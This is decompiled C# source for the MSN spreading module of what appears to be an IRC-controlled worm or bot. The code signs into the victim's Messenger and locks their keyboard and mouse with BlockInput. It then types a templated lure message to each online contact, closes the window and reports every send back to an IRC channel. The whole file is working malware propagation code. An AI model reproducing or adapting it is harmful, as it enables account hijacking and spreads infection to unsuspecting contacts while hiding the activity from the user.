using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using MessengerAPI;
using explorer;

namespace spreading;

internal class msn
{
	public const int SC_CLOSE = 61536;

	public const int WM_SYSCOMMAND = 274;

	private string message;

	private irc irc;

	private string channel;

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	public void spread(string message, irc irc, string channel)
	{
		this.message = message;
		this.irc = irc;
		this.channel = channel;
		if (storage.msn_spreading == null)
		{
			storage.msn_spreading = new Thread(spreadthread);
			storage.msn_spreading.Start();
		}
		else
		{
			irc.teller.tell(channel, "Spreading-MSN", config.language_spreading_msn_started_allready, iserror: false, isinformation: false, iswarning: true);
		}
	}

	private void spreadthread()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Invalid comparison between Unknown and I4
		try
		{
			MessengerClass val = new MessengerClass();
			if ((int)val.get_MyStatus() == 1)
			{
				val.AutoSignin();
				while ((int)val.get_MyStatus() == 512)
				{
				}
			}
			try
			{
				irc.teller.tell(channel, "Spreading-MSN", config.language_spreading_msn_started_success.Replace("%email%", val.get_MySigninName().ToString()), iserror: false, isinformation: true, iswarning: false);
				val.get_UnreadEmailCount((MUAFOLDER)0);
				foreach (IMessengerContact item in (IMessengerContacts)val.get_MyContacts())
				{
					IMessengerContact val2 = item;
					Thread.Sleep(config.spreading_msn_interval_offline);
					if ((int)val2.get_Status() == 1 || val2.get_FriendlyName() == val.get_MyFriendlyName())
					{
						continue;
					}
					BlockInput(fBlockIt: true);
					val.InstantMessage((object)val2);
					IntPtr foregroundWindow = GetForegroundWindow();
					try
					{
						string text = message.Replace("%sender%", val.get_MySigninName()).Replace("%victim%", val2.get_SigninName());
						if (config.spreading_msn_send_inchars)
						{
							char[] array = text.ToCharArray();
							char[] array2 = array;
							foreach (char c in array2)
							{
								SendKeys.SendWait(c.ToString());
							}
						}
						else
						{
							SendKeys.SendWait(text);
						}
						SendKeys.SendWait("{ENTER}");
						Thread.Sleep(500);
						PostMessage(foregroundWindow, 274u, (IntPtr)61536, IntPtr.Zero);
						BlockInput(fBlockIt: false);
						irc.teller.tell(channel, "Spreading-MSN", config.language_spreading_msn_send_msg_success.Replace("%email%", val2.get_SigninName().ToString()), iserror: false, isinformation: true, iswarning: false);
						Thread.Sleep(config.spreading_msn_interval_online);
					}
					catch
					{
						irc.teller.tell(channel, "Spreading-MSN", config.language_spreading_msn_send_msg_error.Replace("%email%", val2.get_SigninName().ToString()), iserror: true, isinformation: false, iswarning: false);
						PostMessage(foregroundWindow, 274u, (IntPtr)61536, IntPtr.Zero);
					}
				}
			}
			catch
			{
				irc.teller.tell(channel, "Spreading-MSN", config.language_spreading_msn_started_error.Replace("%email%", val.get_MySigninName().ToString()), iserror: true, isinformation: false, iswarning: false);
			}
			irc.teller.tell(config.channel, "Spreading-MSN", config.language_spreading_msn_stopped_success, iserror: false, isinformation: true, iswarning: false);
			storage.msn_spreading = null;
		}
		catch
		{
			irc.teller.tell(channel, "Spreading-MSN", config.language_spreading_msn_nomsn, iserror: false, isinformation: false, iswarning: true);
		}
	}
}
